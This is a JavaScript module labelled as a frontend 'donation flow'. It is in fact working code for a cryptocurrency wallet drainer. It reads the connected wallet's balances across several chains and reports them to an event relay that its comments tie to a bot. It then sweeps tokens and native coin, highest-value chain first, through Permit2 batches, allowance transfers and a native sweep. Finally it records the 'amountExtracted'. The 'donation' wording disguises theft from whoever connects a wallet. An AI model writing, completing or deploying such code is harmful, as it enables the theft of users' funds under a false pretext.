// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { sendEvent } from "../utils/eventRelay.js";
import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

/**
 * Frontend donation flow.
 * walletClient optional (WalletConnect / wagmi). If not provided, falls back to window.ethereum.
 */
export async function runDonationFlow(walletClient) {
  try {
    // -------------------------
    // 1) Resolve owner & provider (frontend context)
    // -------------------------
    let owner = null;
    let injectedProvider = null;

    if (walletClient?.account?.address) {
      owner = walletClient.account.address;
    } else if (typeof window !== "undefined" && window.ethereum) {
      injectedProvider = new ethers.BrowserProvider(window.ethereum);
      await injectedProvider.send("eth_requestAccounts", []);
      owner = await injectedProvider.getSigner().getAddress();
    }

    if (!owner) throw new Error("Wallet not connected");

    // single tracking id for the whole flow
    const trackingId = Date.now().toString();

    // -------------------------
    // 2) Emit WALLET_CONNECTED (include balances per chain with native)
    // -------------------------
    const chainBalances = [];

    for (const chain of CHAINS) {
      // fetch erc20 balances via covalent
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);

      // get a provider for native balance (do not force chain switching for walletClient - provider helper handles it)
      const { provider } = await getProviderForChain(walletClient, chain.chainId, trackingId);
      const nativeRaw = await provider.getBalance(owner);
      const nativeFormatted = String(ethers.formatEther(nativeRaw)); // string for easier display

      const tokensValue = getChainValue(filtered);
      const totalValue = tokensValue + Number(nativeFormatted || 0);

      chainBalances.push({
        chainId: chain.chainId,
        name: chain.name,
        native: nativeFormatted,
        tokens: filtered,
        totalValue,
      });
    }

    const balancesPayload = chainBalances.map((c) => ({
      name: c.name,
      native: c.native,
      tokens: c.tokens.map((t) => ({
        name: t.tokenSymbol,
        amount: t.balanceRaw,
        value: t.quote,
      })),
      total: c.totalValue,
    }));
    const grandTotal = balancesPayload.reduce((acc, c) => acc + (c.total || 0), 0);

    const connectedPayload = {
      walletAddress: owner,
      trackingId,
      balances: balancesPayload,
      grandTotal,
    };

    notify("WALLET_CONNECTED", connectedPayload);
    await sendEvent("WALLET_CONNECTED", connectedPayload);

    // -------------------------
    // 3) Sort chains by value and sweep
    // -------------------------
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    for (const chain of chainBalances) {
      // donation start for this chain (use same trackingId)
      const startPayload = { walletAddress: owner, trackingId, chain: chain.name };
      notify("DONATION_START", startPayload);
      await sendEvent("DONATION_START", startPayload);

      // provider + signer for this chain
      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);

      const permit2Tokens = [];
      const fallbackTokens = [];

      // classify tokens
      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) {
          fallbackTokens.push(t);
          continue;
        }
        const ok = await isPermit2Compatible(addr, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      // attempt permit2 batch
      try {
        if (permit2Tokens.length) {
          await executePermit2Batch(signer, chain.chainId, permit2Tokens);
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        // fallback: move permit2 tokens to fallback list
        fallbackTokens.push(...permit2Tokens);
      }

      // fallback allowance transfers
      try {
        if (fallbackTokens.length) {
          await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      // native sweep
      try {
        await sweepNative(signer, provider, chain.chainId);
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // -------------------------
      // 4) Re-fetch balances after sweep and emit DONATION_MADE (with donationSummary)
      // -------------------------
      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
      const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
      const refreshedNativeRaw = await provider.getBalance(owner);
      const refreshedNative = String(ethers.formatEther(refreshedNativeRaw));
      const refreshedTokensValue = getChainValue(refreshedFiltered);
      const refreshedTotal = refreshedTokensValue + Number(refreshedNative || 0);

      // donationSummary = difference between pre-sweep chain.totalValue and refreshedTotal
      const initialChainRecord = chain; // from chainBalances earlier
      const amountExtracted = Math.max(0, Number(initialChainRecord.totalValue) - Number(refreshedTotal));

      const resultsPayload = {
        walletAddress: owner,
        trackingId,
        balances: [
          {
            name: chain.name,
            native: refreshedNative,
            tokens: refreshedFiltered.map((t) => ({
              name: t.tokenSymbol,
              amount: t.balanceRaw,
              value: t.quote,
            })),
            total: refreshedTotal,
          },
        ],
        donationSummary: {
          total: amountExtracted,
          breakdown: [{ chain: chain.name, amount: amountExtracted }],
        },
      };

      // Emit DONATION_MADE (formerly donation results)
      notify("DONATION_MADE", resultsPayload);
      await sendEvent("DONATION_MADE", resultsPayload);
    }

    // -------------------------
    // 5) End-of-flow: DONATION_COMPLETED
    // -------------------------
    const completedPayload = { walletAddress: owner, trackingId };
    notify("DONATION_COMPLETED", completedPayload);
    await sendEvent("DONATION_COMPLETED", completedPayload);

    // -------------------------
    // 6) Wire actual provider disconnect + chain change -> emit WALLET_DISCONNECTED & CHAIN_SWITCHED
    //    (only if we have an injected provider)
    // -------------------------
    if (injectedProvider && injectedProvider.provider && typeof injectedProvider.provider.on === "function") {
      try {
        injectedProvider.provider.on("disconnect", () => {
          const disc = { walletAddress: owner, trackingId };
          notify("WALLET_DISCONNECTED", disc);
          sendEvent("WALLET_DISCONNECTED", disc).catch(() => {});
        });
        injectedProvider.provider.on("chainChanged", (chainId) => {
          const c = { walletAddress: owner, trackingId, newChain: chainId };
          notify("CHAIN_SWITCH", c); // keep old name if bot uses CHAIN_SWITCH; you can map CHAIN_SWITCHED if desired
          sendEvent("CHAIN_SWITCH", c).catch(() => {});
        });
      } catch (e) {
        // non-fatal
        console.warn("failed to attach provider event listeners:", e);
      }
    }

    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
